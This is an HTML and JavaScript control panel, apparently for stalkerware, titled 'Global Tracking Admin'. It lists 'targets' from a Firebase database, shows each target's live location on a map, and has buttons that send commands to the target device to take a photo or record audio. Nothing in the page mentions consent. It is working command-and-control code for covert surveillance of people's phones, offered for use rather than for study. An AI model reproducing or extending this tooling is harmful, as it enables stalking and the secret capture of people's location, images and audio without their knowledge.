<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Global Tracking Admin</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; margin: 0; display: flex; height: 100vh; }
        .sidebar { width: 300px; background: #fff; border-right: 1px solid #ddd; padding: 15px; }
        .main { flex: 1; padding: 20px; display: flex; flex-direction: column; }
        .target-card { padding: 15px; border: 1px solid #eee; margin-bottom: 10px; cursor: pointer; border-radius: 8px; transition: 0.3s; }
        .target-card.active { border-left: 5px solid #1a73e8; background: #e8f0fe; }
        .status-dot { width: 10px; height: 10px; border-radius: 50%; display: inline-block; margin-right: 5px; }
        .online { background: #1e8e3e; box-shadow: 0 0 8px #1e8e3e; }
        .offline { background: #9aa0a6; }
        .map-box { flex: 1; background: #fff; border-radius: 12px; border: 1px solid #ddd; overflow: hidden; margin-bottom: 20px; }
        .controls { display: flex; gap: 10px; }
        button { flex: 1; padding: 15px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; color: #fff; }
        .btn-blue { background: #1a73e8; }
        .btn-red { background: #d93025; }
    </style>
</head>
<body>
    <div class="sidebar">
        <h2>Targets</h2>
        <div id="targetList">Connecting...</div>
    </div>
    <div class="main">
        <h2 id="activeName">Select a target to track</h2>
        <div class="map-box">
            <iframe id="mapFrame" width="100%" height="100%" frameborder="0"></iframe>
        </div>
        <div class="controls">
            <button class="btn-blue" onclick="sendCommand('snap')">üì∏ TAKE PHOTO</button>
            <button class="btn-red" onclick="sendCommand('mic')">üéôÔ∏è RECORD AUDIO</button>
        </div>
    </div>

    <script>
        const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        let selectedId = null;

        db.ref('targets').on('value', (snap) => {
            const list = document.getElementById('targetList');
            list.innerHTML = '';
            snap.forEach((child) => {
                const id = child.key;
                const loc = child.val().location;
                const isOnline = (Date.now() - loc.last_seen) < 15000;
                
                const div = document.createElement('div');
                div.className = `target-card ${selectedId === id ? 'active' : ''}`;
                div.onclick = () => {
                    selectedId = id;
                    document.getElementById('activeName').innerText = "Live: " + id;
                    document.getElementById('mapFrame').src = `https://maps.google.com/maps?q=${loc.lat},${loc.lng}&z=15&output=embed`;
                };
                div.innerHTML = `<span class="status-dot ${isOnline ? 'online' : 'offline'}"></span><b>${id}</b>`;
                list.appendChild(div);
            });
        });

        function sendCommand(act) {
            if(!selectedId) return alert("Target select karein!");
            db.ref('commands/' + selectedId).set({ action: act, time: Date.now() });
            alert("Command Sent!");
        }
    </script>
</body>
</html>
